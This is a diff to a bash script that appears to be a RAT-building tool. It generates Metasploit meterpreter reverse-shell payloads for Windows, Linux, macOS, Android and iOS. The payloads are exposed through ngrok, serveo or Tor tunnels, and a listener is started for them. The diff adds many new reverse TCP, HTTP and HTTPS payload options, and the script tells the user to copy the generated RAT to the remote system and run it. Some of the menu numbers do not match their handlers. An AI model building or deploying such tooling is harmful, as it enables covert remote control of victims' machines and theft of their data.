@@ -28,25 +28,12 @@ startmenu() {
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	case $option in
-		99)      
-			stop 1
-			;;
-		1|01)      
-			menussh
-			;;
-		2|02)
-			ngrokme
-			menungrok		
-			;; 
-		3|03)
-			menutor
-			;;
-		10)
-			menusocat
-			;;
-		20)
-			menumetasploit
-			;;
+		99) stop 1 ;;
+		1|01) menussh ;;
+		2|02) ngrokme; menungrok ;; 
+		3|03) menutor ;;
+		10) menusocat ;;
+		20) menumetasploit ;;
 		30)
 			if [ -d shellphish ]; then 
 				cd shellphish
@@ -227,9 +214,7 @@ menutor() {
 	fi
 
 	case $option in
-		1|01)      
-			toritforward 
-			;;
+		1|01) toritforward ;;
 		2|02)      
 			toritforward
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
@@ -357,26 +342,39 @@ menumetasploit() {
 		startmenu
 	fi
 	case $tunoption in
-		1|01)      
-			tunnel="serveoitforward"
-			;;
-		2|02)      
-			tunnel="ngrokitforward"
-			;;
-		3|03)      
-			tunnel="toritforward"
-			;;
+		1|01) tunnel="serveoitforward" ;;
+		2|02) tunnel="ngrokitforward" ;;
+		3|03) tunnel="toritforward" ;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep 1
 		menumetasploit
 		;;
 	esac
-		
-	printf "\e[92m  [*] Run a Metasploit Meterpreter (Windows) listener        =  1\n"
-	printf "  [*] Run a Metasploit Meterpreter (Linux) listener          =  2\n"
-	printf "  [*] Run a Metasploit Meterpreter (Mac) listener            =  3\n"
-	printf "  [*] Run a Metasploit Meterpreter (Android) listener        =  4\n"
+	menupayloads
+}
+
+menupayloads() {		
+	printf "\e[92m  [*] Windows Meterpreter Reverse TCP Stager                 = 11\n"
+	printf "  [*] Windows Meterpreter Windows Reverse HTTP Stager        = 12\n"
+	printf "  [*] Windows Meterpreter Windows Reverse HTTPS Stager       = 13\n"
+	printf "  [*] Windows Meterpreter Reverse Reverse TCP Stager (IPv6)  = 14\n"
+	printf "  [*] Windows Meterpreter Reverse All-Port TCP Stager        = 15\n"
+	printf "  [*] Linux Meterpreter Reverse TCP Stager                   = 21\n"
+	printf "  [*] Linux Meterpreter Reverse HTTP Inline                  = 22\n"
+	printf "  [*] Linux Meterpreter Reverse HTTPS Inline                 = 23\n"
+	printf "  [*] Linux Meterpreter Reverse TCP Stager (IPv6)            = 24\n"
+	printf "  [*] OSX Meterpreter Reverse TCP Stager                     = 31\n"
+	printf "  [*] OSX Meterpreter Reverse HTTP Inline                    = 32\n"
+	printf "  [*] OSX Meterpreter Reverse HTTPS Inline                   = 33\n"
+	printf "  [*] OSX dup2 Command Shell, Reverse TCP Stager             = 34\n"
+	printf "  [*] Android Meterpreter Reverse TCP Stager                 = 41\n"
+	printf "  [*] Android Meterpreter Reverse HTTP Stager                = 42\n"
+	printf "  [*] Android Meterpreter Reverse HTTPS Stager               = 43\n"
+	printf "  [*] Android Meterpreter Reverse TCP Inline                 = 44\n"
+	printf "  [*] Apple_iOS Meterpreter Reverse TCP Inline               = 41\n"
+	printf "  [*] Apple_iOS Meterpreter Reverse HTTP Inline              = 42\n"
+	printf "  [*] Apple_iOS Meterpreter Reverse HTTPS Inline             = 43\n"
 	printf "  Exit                                                       = 99\n"
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
@@ -387,7 +385,7 @@ menumetasploit() {
 	read lport
 	lport="${lport:-${default_port}}"
 	case $option in
-		1|01)      
+		11)      
 			payload="windows/meterpreter/reverse_tcp"
 			platform="-a x86 --platform windows"
 			filetype="-f exe"
@@ -395,7 +393,42 @@ menumetasploit() {
 			OSType="Windows"
 			$tunnel
 			;;
-		2|02)      
+		12)      
+			payload="windows/meterpreter/reverse_http"
+			platform="-a x86 --platform windows"
+			filetype="-f exe"
+			fileext="exe"
+			OSType="Windows"
+			$tunnel
+			;;
+
+		13)      
+			payload="windows/meterpreter/reverse_https"
+			platform="-a x86 --platform windows"
+			filetype="-f exe"
+			fileext="exe"
+			OSType="Windows"
+			$tunnel
+			;;
+		14)      
+			payload="windows/meterpreter/reverse_tcp_allports"
+			platform="-a x86 --platform windows"
+			filetype="-f exe"
+			fileext="exe"
+			OSType="Windows"
+			$tunnel
+			;;
+		15)      
+			payload="windows/meterpreter/reverse_ipv6_tcp"
+			platform="-a x86 --platform windows"
+			filetype="-f exe"
+			fileext="exe"
+			OSType="Windows"
+			$tunnel
+			;;
+
+
+		21)      
 			payload="linux/x86/meterpreter/reverse_tcp"
 			platform=""
 			filetype="-f elf"
@@ -403,7 +436,31 @@ menumetasploit() {
 			OSType="Linux"
 			$tunnel
 			;;
-		3|03)      
+		22)      
+			payload="linux/x86/meterpreter_reverse_http"
+			platform=""
+			filetype="-f elf"
+			fileext="elf"
+			OSType="Linux"
+			$tunnel
+			;;
+		23)      
+			payload="linux/x86/meterpreter_reverse_https"
+			platform=""
+			filetype="-f elf"
+			fileext="elf"
+			OSType="Linux"
+			$tunnel
+			;;
+		24)      
+			payload="linux/x86/shell/reverse_ipv6_tcp"
+			platform=""
+			filetype="-f elf"
+			fileext="elf"
+			OSType="Linux"
+			$tunnel
+			;;
+		31)      
 			payload="osx/x86/shell_reverse_tcp"
 			platform=""
 			filetype="-f macho"
@@ -411,7 +468,31 @@ menumetasploit() {
 			OSType="Mac"
 			$tunnel
 			;;
-		4|04)      
+		32)      
+			payload="osx/x64/meterpreter_reverse_http"
+			platform=""
+			filetype="-f macho"
+			fileext="macho"
+			OSType="Mac"
+			$tunnel
+			;;
+		33)      
+			payload="osx/x64/meterpreter_reverse_https"
+			platform=""
+			filetype="-f macho"
+			fileext="macho"
+			OSType="Mac"
+			$tunnel
+			;;
+		34)      
+			payload="osx/x64/dupandexecve/reverse_tcp"
+			platform=""
+			filetype="-f macho"
+			fileext="macho"
+			OSType="Mac"
+			$tunnel
+			;;
+		41)      
 			payload="android/meterpreter/reverse_tcp"
 			platform=""
 			filetype="R"
@@ -419,6 +500,56 @@ menumetasploit() {
 			OSType="Android"
 			$tunnel
 			;;
+		42)      
+			payload="android/meterpreter/reverse_http"
+			platform=""
+			filetype="R"
+			fileext="apk"
+			OSType="Android"
+			$tunnel
+			;;
+		43)      
+			payload="android/meterpreter/reverse_https"
+			platform=""
+			filetype="R"
+			fileext="apk"
+			OSType="Android"
+			$tunnel
+			;;
+		44)      
+			payload="android/meterpreter_reverse_tcp"
+			platform=""
+			filetype="R"
+			fileext="apk"
+			OSType="Android"
+			$tunnel
+			;;
+
+		51)      
+			payload="apple_ios/aarch64/meterpreter_reverse_tcp"
+			platform=""
+			filetype="-f macho"
+			fileext="macho"
+			OSType="Mac"
+			$tunnel
+			;;
+		52)      
+			payload="apple_ios/aarch64/meterpreter_reverse_http"
+			platform=""
+			filetype="-f macho"
+			fileext="macho"
+			OSType="Mac"
+			$tunnel
+			;;
+		53)      
+			payload="apple_ios/aarch64/meterpreter_reverse_https"
+			platform=""
+			filetype="-f macho"
+			fileext="macho"
+			OSType="Mac"
+			$tunnel
+			;;
+
 		*)
 		startmenu
 		;;
@@ -435,14 +566,16 @@ MetasploitMe() {
 	read -p $'\e[92mChoose RAT name with ".'$fileext'" extention: ' pname
 	printf "\e[1;93m [!] Starting Metasploit Meterpreter ($OSType) listener on port "$lport"!\e[0m\n"
 	rm -rf reverse-connect.sh
+	meterpreter="msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $filetype -o site/installs/$pname"
 	echo 'msfconsole -x "use exploit/multi/handler; set payload '$payload'; set LPORT '$lport'; set LHOST 127.0.0.1; run;"' > reverse-connect.sh
-	printf "\e[1;93m [!] To create a meterpreter RAT, RUN \n msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $filetype > $pname\n"
+	printf "\e[1;93m [!] To create a meterpreter RAT, RUN \n $meterpreter\n"
 	printf " \e[92mCopy "$pname" to the remote $OSType system \n Then run "$pname"!\n"
 	mkdir site/installs > /dev/null 2>&1
 	service postgresql stop > /dev/null 2>&1
 	service postgresql start > /dev/null 2>&1
 	printf "\e[92mCreating RAT locally, located in the ./site/installs/ folder\n"
-	msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $filetype > site/installs/$pname
+	$meterpreter
+	sleep 3
 	chmod +x site/installs/$pname
 	chmod +x reverse-connect.sh
 	printf "Starting Metasploit with $payload listener...\n"
@@ -579,7 +712,7 @@ toritforward() {
 		MetasploitMe
 	fi
 	if [[ $OSType == "Linux" ]]; then
-		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
+		read -p $"Would you like to test the Linux RAT? (Y)" testme 
 		if [[ $testme == "y" || $testme == "Y" ]]; then
 			echo "torsocks ./site/installs/$pname" > testme.sh
 			bash testme.sh &
@@ -595,6 +728,7 @@ toritforward() {
 
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
+	menutor
 }
 
 ngrokitforward() {
